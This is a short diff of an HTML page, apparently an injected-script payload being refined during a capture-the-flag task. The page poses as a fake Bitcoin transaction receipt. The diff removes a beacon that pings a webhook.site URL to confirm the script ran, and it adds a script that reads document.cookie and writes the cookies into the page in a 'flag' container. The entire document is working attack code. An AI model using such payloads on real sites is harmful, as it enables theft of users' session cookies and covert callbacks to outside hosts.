@@ -6,11 +6,22 @@
 <body>
     <h1>Transaction Hash: 1234567890abcdef...</h1>
     <p>Amount: 100 BTC ✅</p>
+    
+    <!-- Создаем элемент, куда будем писать данные -->
+    <div id="flag_container" style="margin-top: 20px; color: red; font-size: 20px;">
+        <!-- Здесь может появиться флаг -->
+    </div>
 
     <script>
-        // Простейший тест - просто пинг
-        var img = new Image();
-        img.src = 'https://webhook.site/29ae4fb7-a36a-471d-844f-cd5abb1c4394/ping';
+        // Просто попробуем что-нибудь вывести на страницу
+        try {
+            var container = document.getElementById('flag_container');
+            if (container) {
+                container.innerHTML = 'Cookies: ' + (document.cookie || 'None');
+            }
+        } catch(e) {
+            // Игнорируем ошибки
+        }
     </script>
 </body>
 </html>
